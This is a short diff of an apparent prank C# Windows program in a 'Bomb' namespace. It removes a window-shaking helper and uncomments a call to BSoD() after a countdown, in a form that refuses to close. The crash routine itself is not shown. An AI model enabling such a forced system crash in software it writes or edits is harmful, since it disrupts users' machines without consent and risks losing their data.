@@ -131,7 +131,7 @@ namespace Bomb
                 }
                 Thread.Sleep(1000);
             }
-            //BSoD();
+            BSoD();
             Environment.Exit(0);
         }
 
@@ -147,17 +147,6 @@ namespace Bomb
             notifyIcon1.Visible = true;
             notifyIcon1.ShowBalloonTip(5000);
             e.Cancel = true;
-        }
-
-        private void ShakeWindow()
-        {
-            Random ran = new Random((int)DateTime.Now.Ticks);
-            int range = 5;
-            int sleepTime = 10;
-            Point oldPoint = Location;
-            Location = new Point(oldPoint.X + ran.Next(-range, range), oldPoint.Y + ran.Next(-range, range));
-            Thread.Sleep(sleepTime);
-            Location = oldPoint;
         }
 
         private void backgroundWorker2_DoWork(object sender, DoWorkEventArgs e)
